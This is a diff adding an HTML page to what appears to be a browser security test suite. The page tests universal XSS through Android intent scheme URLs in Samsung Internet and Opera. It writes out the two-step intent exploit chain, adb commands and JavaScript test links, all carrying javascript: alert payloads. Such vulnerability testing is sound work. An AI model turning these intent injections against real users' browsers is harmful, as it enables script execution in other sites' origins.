@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>UXSS-OPERA-01: Android Intent Scheme UXSS</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>Android Intent Scheme URL UXSS (Opera / Samsung Pattern)</h1>
+    <div class="meta">
+        <span>ID: UXSS-OPERA-01</span>
+        <span>CVE: CVE-2025-58485 (Samsung), Pattern applies to Opera</span>
+        <span>Browsers: Opera (Android), Samsung Internet, Chromium-based Android browsers</span>
+        <span>Category: UXSS via Intent Scheme</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>Android browsers that export activities with intent filters accepting arbitrary URLs
+        can be exploited for UXSS. If the browser loads an attacker-supplied URL (including
+        <code>javascript:</code> URIs) into the <strong>current tab</strong> via an exported
+        activity, it executes in the context of whatever origin was already loaded.</p>
+        <p>CVE-2025-58485 in Samsung Internet exploited <code>SBrowserMainActivity</code>'s
+        exported <code>INTENT_ACCESS_WEBSITE</code> action. Similar patterns may exist in
+        Opera and other Android browsers.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Technique</h2>
+        <div class="code-block">// Samsung Internet UXSS (CVE-2025-58485):
+// Step 1: Navigate victim to legitimate site via intent
+intent://ebniw.com#Intent;
+  scheme=https;
+  action=com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE;
+  component=com.sec.android.app.sbrowser/.SBrowserMainActivity;
+  S.extra_access_url=https://ebniw.com;
+  S.extra_by_capsule=true;
+  end
+
+// Step 2: After delay, inject javascript: into same tab
+intent://#Intent;
+  action=com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE;
+  component=com.sec.android.app.sbrowser/.SBrowserMainActivity;
+  S.extra_access_url=javascript:alert(document.domain);
+  S.extra_by_capsule=true;
+  end
+
+// Opera variant: Test Opera's exported activities
+// adb shell am start -a android.intent.action.VIEW \
+//   -d "javascript:alert(document.domain)" com.opera.browser
+
+// From a webpage (intent scheme URL):
+// &lt;a href="intent://target.com#Intent;scheme=https;
+//   action=android.intent.action.VIEW;
+//   package=com.opera.browser;end"&gt;Open in Opera&lt;/a&gt;</div>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test (Android Only)</h2>
+        <p style="color:#d29922;font-size:0.85em;">These tests use Android intent:// URLs
+        and only work on Android devices. On desktop, they will show as not applicable.</p>
+        <button class="btn btn-run" onclick="runTest()">Test Intent URL Handling</button>
+        <button class="btn" onclick="testOperaIntent()">Test Opera-specific Intents</button>
+        <button class="btn" onclick="testSamsungIntent()">Test Samsung Internet Intents</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+
+    <div class="test-section">
+        <h2>Manual ADB Test Commands</h2>
+        <div class="code-block"># Test Opera for Android
+adb shell am start -a android.intent.action.VIEW \
+  -d "https://ebniw.com" com.opera.browser
+# Wait 2 seconds, then:
+adb shell am start -a android.intent.action.VIEW \
+  -d "javascript:alert('UXSS:'+document.domain)" com.opera.browser
+
+# Test Samsung Internet
+adb shell am start -a com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE \
+  -n com.sec.android.app.sbrowser/.SBrowserMainActivity \
+  --es extra_access_url "javascript:alert('UXSS:'+document.domain)" \
+  --es extra_by_capsule true
+
+# Test Opera GX for Android
+adb shell am start -a android.intent.action.VIEW \
+  -d "https://ebniw.com" com.opera.gx
+# Then:
+adb shell am start -a android.intent.action.VIEW \
+  -d "javascript:alert('UXSS:'+document.domain)" com.opera.gx</div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Running intent URL handling test...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + '</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Mobile: ' + info.isMobile + '</div>';
+
+    if (!info.isMobile) {
+        output.innerHTML += '<div style="color:#8b949e;">Desktop browser detected. Intent scheme tests only work on Android.</div>';
+        reportResult('output', 'Intent URL UXSS', false, 'Desktop browser - N/A');
+        return;
+    }
+
+    // Test if intent:// URLs are handled
+    const tests = [
+        { name: 'javascript: in intent', url: 'intent://test#Intent;scheme=javascript;end' },
+        { name: 'data: in intent', url: 'intent://text/html,<script>alert(1)</script>#Intent;scheme=data;end' },
+    ];
+
+    tests.forEach(function(test) {
+        try {
+            const link = document.createElement('a');
+            link.href = test.url;
+            output.innerHTML += '<div style="color:#8b949e;">Testing: ' + test.name + '</div>';
+            output.innerHTML += '<div style="color:#8b949e;">URL parsed as: ' + link.href + '</div>';
+        } catch(e) {
+            output.innerHTML += '<div style="color:#8b949e;">' + test.name + ' blocked: ' + e.message + '</div>';
+        }
+    });
+
+    reportResult('output', 'Intent URL handling', false,
+        'Manual testing with ADB recommended. See commands above.');
+}
+
+function testOperaIntent() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Testing Opera-specific intents...</div>';
+
+    if (info.browser !== 'Opera' || !info.isMobile) {
+        output.innerHTML += '<div style="color:#8b949e;">Not Opera mobile. Test requires Opera for Android.</div>';
+        return;
+    }
+
+    // Try Opera-specific intent scheme
+    const intentUrl = 'intent://ebniw.com#Intent;scheme=https;package=com.opera.browser;end';
+    output.innerHTML += '<div style="color:#8b949e;">Attempting Opera intent navigation...</div>';
+
+    const link = document.createElement('a');
+    link.href = intentUrl;
+    link.textContent = 'Click to test Opera intent';
+    link.style.color = '#58a6ff';
+    link.style.display = 'block';
+    link.style.margin = '10px 0';
+    output.appendChild(link);
+}
+
+function testSamsungIntent() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Testing Samsung Internet intents...</div>';
+
+    if (info.browser !== 'Samsung Internet') {
+        output.innerHTML += '<div style="color:#8b949e;">Not Samsung Internet. Test requires Samsung Internet on Android.</div>';
+        return;
+    }
+
+    // Samsung-specific intent
+    const intentUrl = 'intent://#Intent;' +
+        'action=com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE;' +
+        'component=com.sec.android.app.sbrowser/.SBrowserMainActivity;' +
+        'S.extra_access_url=javascript:void(document.title);' +
+        'S.extra_by_capsule=true;' +
+        'end';
+
+    const link = document.createElement('a');
+    link.href = intentUrl;
+    link.textContent = 'Click to test Samsung intent (safe payload)';
+    link.style.color = '#58a6ff';
+    link.style.display = 'block';
+    link.style.margin = '10px 0';
+    output.appendChild(link);
+
+    output.innerHTML += '<div style="color:#d29922;">If clicking the link above loads javascript: in the current tab context, the browser is vulnerable.</div>';
+}
+</script>
+</body>
+</html>
